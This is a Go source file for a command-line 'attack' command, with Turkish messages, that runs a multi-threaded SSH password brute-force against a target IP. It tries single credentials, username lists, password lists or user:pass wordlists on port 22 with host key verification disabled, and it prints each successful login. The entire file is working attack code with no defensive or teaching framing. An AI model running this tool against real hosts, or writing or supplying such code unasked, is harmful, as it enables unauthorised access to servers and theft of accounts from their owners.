/*
Copyright © 2024 NAME HERE <EMAIL ADDRESS>
*/
package cmd

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"sync"

	"github.com/spf13/cobra"
	"golang.org/x/crypto/ssh"
)

// attackCmd represents the attack command
var attackCmd = &cobra.Command{
	Use:   "attack",
	Short: "Atak Modu",
	Long:  `Atağınız yapılacak.`,
	Run:   attackFunc,
}

func attackFunc(cmd *cobra.Command, args []string) {

	if !cmd.Flags().Changed("username") && !cmd.Flags().Changed("username-list") {
		fmt.Println("-u veya -U parametresinden birisini girmeniz gerekli!")
		return
	}

	if !cmd.Flags().Changed("password") && !cmd.Flags().Changed("password-list") {
		fmt.Println("-p veya -P parametresinden birisini girmeniz gerekli!")
		return
	}

	if cmd.Flags().Changed("password") && cmd.Flags().Changed("password-list") || cmd.Flags().Changed("username") && cmd.Flags().Changed("username-list") {
		fmt.Println("lütfen tek mod seçin!")
		return
	}

	if !cmd.Flags().Changed("target") {
		fmt.Println("Hedef IP adresi girilmesi gerekli!")
		return
	}

	target, _ := cmd.Flags().GetString("target")
	workers, _ := cmd.Flags().GetInt("workers")

	// Wordlist modu seçilmişse
	if cmd.Flags().Changed("username-list") && cmd.Flags().Changed("password-list") {
		if !cmd.Flags().Changed("wordlist") {
			fmt.Println("Wordlist Girmeniz Gerekli!")
			return
		}
		wl, _ := cmd.Flags().GetString("wordlist")
		creds, err := dosyaOku(wl)
		if err != nil {
			fmt.Println("Bilgiler txt'den alınamadı.")
			return
		}

		if creds, ok := creds.([][2]string); ok {
			cred_channel := make(chan [2]string, len(creds))

			var wg sync.WaitGroup

			for i := 0; i < workers; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for cred := range cred_channel {
						success := sshConnection(cred[0], cred[1], target)
						if success {
							str := fmt.Sprintf("Başarılı Giriş! Kullanıcı Adı:%s Parola:%s", cred[0], cred[1])
							fmt.Println(str)
						}

					}
				}()
			}

			for _, cred := range creds {
				cred_channel <- cred
			}

			close(cred_channel)

			wg.Wait()

		}
	}

	if cmd.Flags().Changed("username") && cmd.Flags().Changed("password") { //tek kullanıcı adı ve tek şifre modu seçilmişse
		uname, _ := cmd.Flags().GetString("username")
		pwd, _ := cmd.Flags().GetString("password")
		host, _ := cmd.Flags().GetString("target")

		if sshConnection(uname, pwd, host) {
			fmt.Println("Başarıyla Bağlantı kuruldu!")
		}

	}

	if cmd.Flags().Changed("username") && !cmd.Flags().Changed("username-list") && cmd.Flags().Changed("password-list") && !cmd.Flags().Changed("password") { //Şifre brute-force
		//Parametreler
		uname, _ := cmd.Flags().GetString("username")
		wl, _ := cmd.Flags().GetString("wordlist")
		workers, _ := cmd.Flags().GetInt("workers")
		host, _ := cmd.Flags().GetString("target")

		creds, err := dosyaOku(wl)

		if err != nil {
			fmt.Println(err)
			return
		}

		if creds, ok := creds.([]string); ok {

			//Değişkenler
			cred_channel := make(chan string, len(creds))

			var wg sync.WaitGroup
			//

			for i := 0; i < workers; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for pwd := range cred_channel {
						if sshConnection(uname, pwd, host) {
							str := fmt.Sprintf("Giriş Başarılı! Kullanıcı Adı:%s Şifre:%s", uname, pwd)
							fmt.Println(str)
						}
					}

				}()
			}

			for _, cred := range creds {
				cred_channel <- cred
			}

			close(cred_channel)

			wg.Wait()

		}
	}

	if !cmd.Flags().Changed("username") && cmd.Flags().Changed("username-list") && cmd.Flags().Changed("password") && !cmd.Flags().Changed("password-list") { //Username brute-force
		//Parametreler
		pwd, _ := cmd.Flags().GetString("password")
		wl, _ := cmd.Flags().GetString("wordlist")
		workers, _ := cmd.Flags().GetInt("workers")
		host, _ := cmd.Flags().GetString("target")

		creds, err := dosyaOku(wl)

		if err != nil {
			fmt.Println(err)
			return
		}

		if creds, ok := creds.([]string); ok {

			//Değişkenler
			cred_channel := make(chan string, len(creds))

			var wg sync.WaitGroup
			//

			for i := 0; i < workers; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for uname := range cred_channel {
						if sshConnection(uname, pwd, host) {
							str := fmt.Sprintf("Giriş Başarılı! Kullanıcı Adı:%s Şifre:%s", uname, pwd)
							fmt.Println(str)
						}
					}

				}()
			}

			for _, cred := range creds {
				cred_channel <- cred
			}

			close(cred_channel)

			wg.Wait()

		}
	}
}

func init() {
	rootCmd.AddCommand(attackCmd)

	attackCmd.Flags().StringP("username", "u", "", "Kullanıcı adı girin.")
	attackCmd.Flags().BoolP("username-list", "U", false, "Kullanıcı adı BRUTE-FORCE modunu açmak için.")
	attackCmd.Flags().StringP("password", "p", "default", "Şifre girin. )")
	attackCmd.Flags().BoolP("password-list", "P", false, "Şifre BRUTE-FORCE modunu açmak için.")
	attackCmd.Flags().StringP("target", "t", "", "Hedef IP adresini girin.")
	attackCmd.Flags().StringP("wordlist", "w", "", "Wordlist dosyasının yolu")
	attackCmd.Flags().IntP("workers", "W", 1, "İş parçacığı sayısını seçin")

	attackCmd.MarkFlagRequired("target")
	attackCmd.MarkFlagRequired("workers")
}

func sshConnection(u string, p string, host string) bool {
	sshConfig := &ssh.ClientConfig{
		User: u,
		Auth: []ssh.AuthMethod{ssh.Password(p)},
	}
	sshConfig.HostKeyCallback = ssh.InsecureIgnoreHostKey()

	client, err := ssh.Dial("tcp", host+":22", sshConfig)
	if err != nil {
		return false
	}
	defer client.Close()

	return true
}

func dosyaOku(fileName string) (interface{}, error) {
	file, err := os.OpenFile(fileName, os.O_RDONLY, 0444)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	/* */
	var credentials interface{}
	/* */

	sc := bufio.NewScanner(file)
	for sc.Scan() {
		satir := sc.Text()

		if parcalar := strings.Split(satir, ":"); len(parcalar) == 2 {
			if credentials == nil {
				credentials = [][2]string{}
			}
			credentials = append(credentials.([][2]string), [2]string{parcalar[0], parcalar[1]})
		} else {
			if credentials == nil {
				credentials = []string{}
			}
			credentials = append(credentials.([]string), satir)
		}
	}
	return credentials, nil
}
